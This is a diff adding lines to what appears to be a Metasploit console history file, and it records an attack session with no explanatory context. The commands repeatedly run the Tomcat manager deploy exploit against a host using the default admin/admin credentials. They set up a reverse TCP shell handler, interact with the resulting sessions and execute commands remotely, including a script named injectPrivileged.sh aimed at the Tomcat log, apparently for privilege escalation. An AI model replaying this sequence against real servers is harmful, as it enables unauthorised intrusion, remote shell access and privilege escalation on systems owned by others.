@@ -298,3 +298,156 @@ check
 exploit
 exit
 exit
+use exploit/multi/http/tomcat_mgr_deploy 
+set RHOST 10.0.75.2
+set RPORT 8080
+set HttpPassword admin
+set HttpUsername admin
+set target 1
+check
+set PATH /manager/html
+check
+exploit
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+set HttpUsername admin
+set HttpPassword admin
+set RHOST 10.0.75.2:8080
+set RHOST 10.0.75.2
+set RPORT 8080
+set target 1
+set PATH /manager/html
+check
+exploit
+check
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+run injectPrivileged
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+set HttpUsername admin
+set HttpPassword admin
+set RHOST 10.0.75.2
+set RPORT 8080
+set PATH /manager/html
+set target 1
+exploit
+exploit
+use exploit/multi/handler; set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.75.2; set LPORT 9595
+exit
+ use exploit/multi/handler; set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.75.2; set LPORT 9595
+ use exploit multi/handler; set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.75.2; set LPORT 9595
+use exploit/multi/handler 
+set PAYLOAD linux/x86/shell/reverse_tcp;
+exit
+sessions
+exit
+exit
+exit -y
+sessions
+exit
+exit -y
+exit -y
+exit -y
+back
+sessions
+sessions -h
+sessions -i 1
+exit
+back
+sessions
+use exploit/multi/http/tomcat_mgr_deploy 
+set HttpUsername admin
+set HttpPassword admin
+set RHOST 10.0.75.2
+set RPORT 8080
+set target 1
+set PATH /manager/html
+exploit
+exploit
+exploit
+exploit
+back
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+set HttpUsername
+set HttpUsername admin
+exit
+exit
+exploit
+sessions
+sessions -i 2
+exit
+exit
+exit
+exit
+sessions
+sessions -i 2
+sessions
+exit
+exit
+exit
+exit
+exit
+exit
+sessions
+sessions
+sessions -h
+sessions -c "touch /tmp/qqqqq.q"
+sessions -c "id"
+sessions -c "id > /tmp/qqq.q"
+sessions -c "/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out"
+exit
+exit -y
+exit
+sessions
+sessions -c \"/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out\"
+sessions -c "/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out"
+sessions -c "/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out > all.s"
+sessions -c "/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out > /tmp/all.s"
+sessions -c "id"
+sessions
+sessions -i 2
+sessions
+sessions -h
+sessions -v
+exit
+sessions
+sessions -c '/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out'
+help
+exit
+exit -y
+sessions -i 2
+exit
+exit
+exit -y
+exit
+exit -y
